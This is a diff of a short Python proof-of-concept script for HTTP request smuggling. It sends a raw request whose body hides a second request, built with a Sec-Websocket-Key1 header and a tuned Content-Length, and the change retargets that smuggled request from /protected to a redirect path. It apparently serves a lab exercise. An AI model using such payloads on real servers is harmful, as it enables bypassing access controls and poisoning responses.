@@ -7,11 +7,11 @@ PORT = 80
 PAYLOAD = (
     b"GET / HTTP/1.1\r\n" +
     b"Host: localhost\r\n" +
-    b"Content-Length: 54\r\n" +
+    b"Content-Length: 61\r\n" +
     b"Sec-Websocket-Key1: x\r\n" + 
     b"\r\n" +
-    b"xxxxxxxxGET /protected HTTP/1.1\r\n" +
-    b"Host: localhost\r\n" +                
+    b"xxxxxxxxGET /redirected HTTP/1.1\r\n" +
+    b"Host: www.example.com\r\n" +  
     b"X: x"
 )
 
@@ -20,7 +20,7 @@ def visualise_payload():
 
 def main():
     visualise_payload()
-    
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setblocking(True)
     sock.connect((SERVER, PORT))
